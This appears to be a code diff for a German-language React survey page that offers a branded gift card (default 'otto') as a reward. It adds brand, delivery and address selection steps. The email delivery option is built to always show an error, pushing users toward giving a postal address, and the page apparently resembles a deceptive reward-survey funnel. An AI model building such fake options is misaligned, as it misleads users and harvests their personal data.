@@ -12,8 +12,10 @@ const Survey = () => {
   const [processingStep, setProcessingStep] = useState(1);
   const [showRewards, setShowRewards] = useState(false);
   const [selectedBrand, setSelectedBrand] = useState('otto');
-  const [selectedDelivery, setSelectedDelivery] = useState('email');
+  const [selectedDelivery, setSelectedDelivery] = useState('');
   const [showEmailError, setShowEmailError] = useState(false);
+  const [selectedAddress, setSelectedAddress] = useState('');
+  const [rewardStep, setRewardStep] = useState(1);
 
   const totalSteps = 9;
 
@@ -369,28 +371,51 @@ const Survey = () => {
 
           const currentBrand = brands[selectedBrand] || brands.otto;
 
+          const handleBrandSelect = (brand: string) => {
+            setSelectedBrand(brand);
+            setRewardStep(1);
+          };
+
+          const handleEmailClick = () => {
+            setSelectedDelivery('');
+            setSelectedAddress('');
+            setShowEmailError(true);
+            setRewardStep(1);
+          };
+
+          const handleHomeSelect = () => {
+            setSelectedDelivery('home');
+            setShowEmailError(false);
+            setRewardStep(2);
+          };
+
+          const handleAddressSelect = (addressType: string) => {
+            setSelectedAddress(addressType);
+            setRewardStep(3);
+          };
+
           return (
             <div className="bg-white rounded-lg shadow-lg overflow-hidden">
               {/* Step Indicators */}
               <div className="bg-gray-50 px-8 py-6">
                 <div className="flex justify-center space-x-8">
                   <div className="flex items-center space-x-2">
-                    <div className="w-8 h-8 bg-pink-600 text-white rounded-full flex items-center justify-center text-sm font-bold">
+                    <div className={`w-8 h-8 ${rewardStep >= 1 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
                       1
                     </div>
-                    <span className="text-pink-600 font-medium">Marke wählen</span>
+                    <span className={`${rewardStep >= 1 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Marke wählen</span>
                   </div>
                   <div className="flex items-center space-x-2">
-                    <div className="w-8 h-8 bg-pink-600 text-white rounded-full flex items-center justify-center text-sm font-bold">
+                    <div className={`w-8 h-8 ${rewardStep >= 2 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm font-bold`}>
                       2
                     </div>
-                    <span className="text-pink-600 font-medium">Lieferoption wählen</span>
+                    <span className={`${rewardStep >= 2 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Lieferoption wählen</span>
                   </div>
                   <div className="flex items-center space-x-2">
-                    <div className="w-8 h-8 bg-gray-300 text-gray-600 rounded-full flex items-center justify-center text-sm">
+                    <div className={`w-8 h-8 ${rewardStep >= 3 ? 'bg-pink-600 text-white' : 'bg-gray-300 text-gray-600'} rounded-full flex items-center justify-center text-sm`}>
                       3
                     </div>
-                    <span className="text-gray-500">Auswahl bestätigen</span>
+                    <span className={`${rewardStep >= 3 ? 'text-pink-600 font-medium' : 'text-gray-500'}`}>Auswahl bestätigen</span>
                   </div>
                 </div>
               </div>
@@ -411,7 +436,7 @@ const Survey = () => {
                       ].map((item) => (
                         <button
                           key={item.brand}
-                          onClick={() => setSelectedBrand(item.brand)}
+                          onClick={() => handleBrandSelect(item.brand)}
                           className={`p-4 border-2 rounded-lg transition-all ${
                             selectedBrand === item.brand
                               ? 'border-pink-600 bg-pink-50'
@@ -493,7 +518,7 @@ const Survey = () => {
 
                     {/* Email Option (Clickable but shows error) */}
                     <button 
-                      onClick={() => setShowEmailError(true)}
+                      onClick={handleEmailClick}
                       className="w-full border border-gray-300 rounded-lg p-4 mb-4 hover:border-red-300 transition-colors"
                     >
                       <div className="flex items-center justify-between">
@@ -510,10 +535,7 @@ const Survey = () => {
 
                     {/* Home Delivery Option */}
                     <button 
-                      onClick={() => {
-                        setSelectedDelivery('home');
-                        setShowEmailError(false);
-                      }}
+                      onClick={handleHomeSelect}
                       className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors ${
                         selectedDelivery === 'home' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
                       }`}
@@ -550,37 +572,51 @@ const Survey = () => {
                           </div>
                         </div>
 
-                        {/* Address Selection */}
-                        <div className="border border-pink-600 rounded-lg p-4 mb-4 bg-pink-50">
+                        {/* Address Selection - Clickable buttons */}
+                        <button
+                          onClick={() => handleAddressSelect('meine')}
+                          className={`w-full border-2 rounded-lg p-4 mb-4 transition-colors ${
+                            selectedAddress === 'meine' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
+                          }`}
+                        >
                           <div className="flex items-center space-x-3">
-                            <div className="w-5 h-5 border-2 border-pink-600 rounded-full bg-pink-600 flex items-center justify-center">
-                              <div className="w-2 h-2 bg-white rounded-full"></div>
+                            <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
+                              selectedAddress === 'meine' ? 'bg-pink-600' : ''
+                            } flex items-center justify-center`}>
+                              {selectedAddress === 'meine' && <div className="w-2 h-2 bg-white rounded-full"></div>}
                             </div>
-                            <div className="flex-1">
+                            <div className="text-left">
                               <div className="font-semibold text-gray-800">👤 Meine Adresse</div>
-                              <input 
-                                type="text" 
-                                placeholder="Senden Sie die Geschenkkarte an meine Lieferadresse"
-                                className="w-full mt-2 p-2 border border-gray-300 rounded text-sm"
-                              />
+                              <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte an meine Lieferadresse</div>
                             </div>
                           </div>
-                        </div>
+                        </button>
 
-                        <div className="border border-gray-300 rounded-lg p-4 mb-6 bg-gray-50">
+                        <button
+                          onClick={() => handleAddressSelect('andere')}
+                          className={`w-full border-2 rounded-lg p-4 mb-6 transition-colors ${
+                            selectedAddress === 'andere' ? 'border-pink-600 bg-pink-50' : 'border-gray-300 hover:border-pink-300'
+                          }`}
+                        >
                           <div className="flex items-center space-x-3">
-                            <div className="w-5 h-5 border-2 border-gray-400 rounded-full"></div>
-                            <div>
-                              <div className="font-semibold text-gray-600">👥 Adresse einer anderen Person</div>
-                              <div className="text-sm text-gray-500">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
+                            <div className={`w-5 h-5 border-2 border-pink-600 rounded-full ${
+                              selectedAddress === 'andere' ? 'bg-pink-600' : ''
+                            } flex items-center justify-center`}>
+                              {selectedAddress === 'andere' && <div className="w-2 h-2 bg-white rounded-full"></div>}
+                            </div>
+                            <div className="text-left">
+                              <div className="font-semibold text-gray-800">👥 Adresse einer anderen Person</div>
+                              <div className="text-sm text-gray-600">Senden Sie die Geschenkkarte direkt an den Empfänger</div>
                             </div>
                           </div>
-                        </div>
+                        </button>
 
-                        {/* Continue Button */}
-                        <Button className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors">
-                          Weiter
-                        </Button>
+                        {/* Continue Button - Show when address is selected */}
+                        {selectedAddress && (
+                          <Button className="w-full bg-pink-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-pink-700 transition-colors">
+                            Weiter
+                          </Button>
+                        )}
 
                         <p className="text-xs text-gray-500 mt-4">
                           Die Geschenkkarte wird per Post versendet und kann je nach Anbieter als Plastikkarte, 
